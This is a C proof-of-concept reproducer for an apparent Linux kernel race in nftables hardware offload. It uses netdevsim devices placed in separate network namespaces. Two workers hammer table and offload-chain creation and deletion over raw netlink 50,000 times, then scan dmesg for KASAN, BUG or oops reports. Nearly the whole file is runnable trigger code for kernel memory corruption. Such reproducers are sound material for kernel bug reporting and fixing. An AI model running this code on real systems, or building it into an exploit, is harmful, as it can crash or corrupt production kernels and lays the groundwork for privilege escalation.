// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdint.h>
#include <dirent.h>

#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if.h>

static int set_if_up(const char *ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP;
    int ret = ioctl(fd, SIOCSIFFLAGS, &ifr);
    close(fd);
    return ret;
}

static unsigned int if_nametoindex_manual(const char *ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        close(fd);
        return 0;
    }
    close(fd);
    return ifr.ifr_ifindex;
}

static int find_nsim_netdev(int dev_id, char *out, int outlen) {
    char path[256];
    snprintf(path, sizeof(path), "/sys/devices/netdevsim%d/net", dev_id);
    DIR *d = opendir(path);
    if (!d) {
        snprintf(path, sizeof(path), "/sys/bus/netdevsim/devices/netdevsim%d/net", dev_id);
        d = opendir(path);
    }
    if (!d) return -1;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] != '.') {
            strncpy(out, ent->d_name, outlen-1);
            out[outlen-1] = 0;
            closedir(d);
            return 0;
        }
    }
    closedir(d);
    return -1;
}

static int nf_sock(void) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (fd < 0) { perror("socket(NETLINK_NETFILTER)"); exit(1); }
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(fd, (struct sockaddr *)&sa, sizeof(sa));
    return fd;
}

static int rt_sock(void) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) return -1;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(fd, (struct sockaddr *)&sa, sizeof(sa));
    return fd;
}

static int nla_total(int payload) {
    return ((4 + payload + 3) & ~3);
}

static void *nla_put(void *pos, int type, int len, const void *data) {
    uint16_t *hdr = pos;
    hdr[0] = 4 + len;
    hdr[1] = type;
    if (data) memcpy((char *)pos + 4, data, len);
    return (char *)pos + nla_total(len);
}

struct nlbuf {
    char buf[16384];
    int off;
    int seq;
};

static void nlbuf_init(struct nlbuf *b) {
    memset(b, 0, sizeof(*b));
    b->seq = 1;
}

static void nlbuf_begin(struct nlbuf *b) {
    struct nlmsghdr *nlh = (void *)(b->buf + b->off);
    int hdrlen = NLMSG_ALIGN(sizeof(*nlh) + sizeof(struct nfgenmsg));
    nlh->nlmsg_len = hdrlen;
    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = b->seq++;
    struct nfgenmsg *nfg = (void *)((char *)nlh + NLMSG_ALIGN(sizeof(*nlh)));
    nfg->nfgen_family = AF_UNSPEC;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = htons(NFNL_SUBSYS_NFTABLES);
    b->off += hdrlen;
}

static void nlbuf_end(struct nlbuf *b) {
    struct nlmsghdr *nlh = (void *)(b->buf + b->off);
    int hdrlen = NLMSG_ALIGN(sizeof(*nlh) + sizeof(struct nfgenmsg));
    nlh->nlmsg_len = hdrlen;
    nlh->nlmsg_type = NFNL_MSG_BATCH_END;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = b->seq++;
    struct nfgenmsg *nfg = (void *)((char *)nlh + NLMSG_ALIGN(sizeof(*nlh)));
    nfg->nfgen_family = AF_UNSPEC;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = htons(NFNL_SUBSYS_NFTABLES);
    b->off += hdrlen;
}

static int nf_send(int fd, struct nlbuf *b) {
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    return sendto(fd, b->buf, b->off, 0, (struct sockaddr *)&sa, sizeof(sa));
}

static int nf_recv_check(int fd) {
    char buf[8192];
    int ret = recv(fd, buf, sizeof(buf), 0);
    if (ret < 0) return -errno;
    struct nlmsghdr *nlh = (void *)buf;
    while (NLMSG_OK(nlh, ret)) {
        if (nlh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = NLMSG_DATA(nlh);
            return err->error;
        }
        nlh = NLMSG_NEXT(nlh, ret);
    }
    return 0;
}

static int nft_create_table(int fd, const char *table_name) {
    struct nlbuf b;
    nlbuf_init(&b);
    nlbuf_begin(&b);

    int attr_sz = nla_total(strlen(table_name)+1);
    struct nlmsghdr *nlh = (void *)(b.buf + b.off);
    int hdrlen = NLMSG_ALIGN(sizeof(*nlh) + sizeof(struct nfgenmsg));
    nlh->nlmsg_len = hdrlen + attr_sz;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
    nlh->nlmsg_seq = b.seq++;
    struct nfgenmsg *nfg = (void *)((char *)nlh + NLMSG_ALIGN(sizeof(*nlh)));
    nfg->nfgen_family = NFPROTO_NETDEV;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = 0;
    nla_put((char *)nlh + hdrlen, NFTA_TABLE_NAME, strlen(table_name)+1, table_name);
    b.off += NLMSG_ALIGN(nlh->nlmsg_len);

    nlbuf_end(&b);
    nf_send(fd, &b);
    return nf_recv_check(fd);
}

static int nft_create_offload_chain(int fd, const char *table_name,
                                     const char *chain_name,
                                     const char *dev_name) {
    struct nlbuf b;
    nlbuf_init(&b);
    nlbuf_begin(&b);

    {
        char attrs[4096];
        void *p = attrs;

        p = nla_put(p, NFTA_CHAIN_TABLE, strlen(table_name)+1, table_name);
        p = nla_put(p, NFTA_CHAIN_NAME, strlen(chain_name)+1, chain_name);

        {
            char hook_buf[256];
            void *hp = hook_buf;
            uint32_t hooknum = htonl(0);
            hp = nla_put(hp, NFTA_HOOK_HOOKNUM, 4, &hooknum);
            int32_t prio = htonl(10);
            hp = nla_put(hp, NFTA_HOOK_PRIORITY, 4, &prio);
            hp = nla_put(hp, NFTA_HOOK_DEV, strlen(dev_name)+1, dev_name);
            int hook_len = (char *)hp - hook_buf;
            uint16_t *hdr = p;
            hdr[0] = 4 + hook_len;
            hdr[1] = NFTA_CHAIN_HOOK | (1 << 15);
            memcpy((char *)p + 4, hook_buf, hook_len);
            p = (char *)p + nla_total(hook_len);
        }

        uint32_t policy = htonl(NF_ACCEPT);
        p = nla_put(p, NFTA_CHAIN_POLICY, 4, &policy);
        p = nla_put(p, NFTA_CHAIN_TYPE, 7, "filter");
        uint32_t flags = htonl(2);
        p = nla_put(p, NFTA_CHAIN_FLAGS, 4, &flags);

        int attr_len = (char *)p - attrs;

        struct nlmsghdr *nlh = (void *)(b.buf + b.off);
        int hdrlen = NLMSG_ALIGN(sizeof(*nlh) + sizeof(struct nfgenmsg));
        nlh->nlmsg_len = hdrlen + attr_len;
        nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
        nlh->nlmsg_seq = b.seq++;
        struct nfgenmsg *nfg = (void *)((char *)nlh + NLMSG_ALIGN(sizeof(*nlh)));
        nfg->nfgen_family = NFPROTO_NETDEV;
        nfg->version = NFNETLINK_V0;
        nfg->res_id = 0;
        memcpy((char *)nlh + hdrlen, attrs, attr_len);
        b.off += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    nlbuf_end(&b);
    nf_send(fd, &b);
    return nf_recv_check(fd);
}

static int nft_delete_table(int fd, const char *table_name) {
    struct nlbuf b;
    nlbuf_init(&b);
    nlbuf_begin(&b);

    int attr_sz = nla_total(strlen(table_name)+1);
    struct nlmsghdr *nlh = (void *)(b.buf + b.off);
    int hdrlen = NLMSG_ALIGN(sizeof(*nlh) + sizeof(struct nfgenmsg));
    nlh->nlmsg_len = hdrlen + attr_sz;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELTABLE;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = b.seq++;
    struct nfgenmsg *nfg = (void *)((char *)nlh + NLMSG_ALIGN(sizeof(*nlh)));
    nfg->nfgen_family = NFPROTO_NETDEV;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = 0;
    nla_put((char *)nlh + hdrlen, NFTA_TABLE_NAME, strlen(table_name)+1, table_name);
    b.off += NLMSG_ALIGN(nlh->nlmsg_len);

    nlbuf_end(&b);
    nf_send(fd, &b);
    return nf_recv_check(fd);
}

static int move_netdev_to_ns(const char *ifname, pid_t pid) {
    int fd = rt_sock();
    if (fd < 0) return -1;

    unsigned int ifindex = if_nametoindex_manual(ifname);
    if (ifindex == 0) {
        printf("[-] if_nametoindex(%s) failed\n", ifname);
        close(fd);
        return -1;
    }

    struct {
        struct nlmsghdr nlh;
        struct ifinfomsg ifi;
        char attrs[64];
    } req;
    memset(&req, 0, sizeof(req));

    int hdrlen = NLMSG_ALIGN(sizeof(struct nlmsghdr) + sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_SETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.nlh.nlmsg_seq = 1;
    req.ifi.ifi_family = AF_UNSPEC;
    req.ifi.ifi_index = ifindex;

    struct rtattr *rta = (void *)((char *)&req + hdrlen);
    rta->rta_type = 19;
    rta->rta_len = RTA_LENGTH(sizeof(uint32_t));
    *(uint32_t *)RTA_DATA(rta) = pid;
    req.nlh.nlmsg_len = hdrlen + RTA_ALIGN(rta->rta_len);

    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    sendto(fd, &req, req.nlh.nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));

    char buf[4096];
    recv(fd, buf, sizeof(buf), 0);
    close(fd);
    return 0;
}

static int create_netdevsim(int id) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%d 1", id);
    int fd = open("/sys/bus/netdevsim/new_device", O_WRONLY);
    if (fd < 0) { perror("open new_device"); return -1; }
    int ret = write(fd, buf, strlen(buf));
    close(fd);
    if (ret < 0) { perror("write new_device"); return -1; }
    usleep(500000);
    return 0;
}

static void delete_netdevsim(int id) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%d", id);
    int fd = open("/sys/bus/netdevsim/del_device", O_WRONLY);
    if (fd >= 0) { write(fd, buf, strlen(buf)); close(fd); }
}

struct worker_args {
    int ns_id;
    char dev_name[64];
    int ready_pipe[2];
    int go_pipe[2];
};

static void worker(struct worker_args *a) {
    set_if_up("lo");
    set_if_up(a->dev_name);

    char table_name[64], chain_name[64];
    snprintf(table_name, sizeof(table_name), "t%d", a->ns_id);
    snprintf(chain_name, sizeof(chain_name), "c%d", a->ns_id);

    int fd = nf_sock();

    int ret;
    ret = nft_create_table(fd, table_name);
    printf("[*] Worker %d: create table ret=%d\n", a->ns_id, ret);
    ret = nft_create_offload_chain(fd, table_name, chain_name, a->dev_name);
    printf("[*] Worker %d: create offload chain ret=%d\n", a->ns_id, ret);
    ret = nft_delete_table(fd, table_name);
    printf("[*] Worker %d: delete table ret=%d\n", a->ns_id, ret);

    char c = 'R';
    write(a->ready_pipe[1], &c, 1);
    read(a->go_pipe[0], &c, 1);

    printf("[*] Worker %d starting race on dev %s\n", a->ns_id, a->dev_name);

    for (int i = 0; i < 50000; i++) {
        nft_create_table(fd, table_name);
        nft_create_offload_chain(fd, table_name, chain_name, a->dev_name);
        nft_delete_table(fd, table_name);
        if (i % 5000 == 0)
            printf("[*] Worker %d: iteration %d\n", a->ns_id, i);
    }

    close(fd);
    printf("[*] Worker %d finished\n", a->ns_id);
}

int main(void) {
    printf("[*] PoC: driver_block_list race in nft offload + netdevsim\n");

    if (create_netdevsim(10) < 0 || create_netdevsim(11) < 0) {
        printf("[-] Failed to create netdevsim. CONFIG_NETDEVSIM=y?\n");
        return 1;
    }

    char devnames[2][64];
    find_nsim_netdev(10, devnames[0], sizeof(devnames[0]));
    find_nsim_netdev(11, devnames[1], sizeof(devnames[1]));
    printf("[+] Devices: %s, %s\n", devnames[0], devnames[1]);

    struct worker_args args[2];
    pid_t pids[2];

    for (int i = 0; i < 2; i++) {
        args[i].ns_id = i;
        strncpy(args[i].dev_name, devnames[i], sizeof(args[i].dev_name));
        pipe(args[i].ready_pipe);
        pipe(args[i].go_pipe);
    }

    for (int i = 0; i < 2; i++) {
        pids[i] = fork();
        if (pids[i] == 0) {
            if (unshare(CLONE_NEWNET) < 0) { perror("unshare"); exit(1); }
            char c = 'N';
            write(args[i].ready_pipe[1], &c, 1);
            read(args[i].go_pipe[0], &c, 1);
            worker(&args[i]);
            exit(0);
        }
    }

    for (int i = 0; i < 2; i++) {
        char c; read(args[i].ready_pipe[0], &c, 1);
    }

    for (int i = 0; i < 2; i++) {
        move_netdev_to_ns(devnames[i], pids[i]);
        usleep(200000);
    }

    for (int i = 0; i < 2; i++) {
        char c = 'M'; write(args[i].go_pipe[1], &c, 1);
    }

    for (int i = 0; i < 2; i++) {
        char c; read(args[i].ready_pipe[0], &c, 1);
        printf("[*] Worker %d tested OK\n", i);
    }

    printf("[*] GO!\n");
    for (int i = 0; i < 2; i++) {
        char c = 'G'; write(args[i].go_pipe[1], &c, 1);
    }

    for (int i = 0; i < 2; i++) {
        int status; waitpid(pids[i], &status, 0);
    }

    printf("[*] Done. dmesg:\n");
    system("dmesg | grep -iE 'BUG|KASAN|WARN|panic|oops|corrupt|list_|RIP' | head -30");
    system("dmesg | tail -80");

    return 0;
}
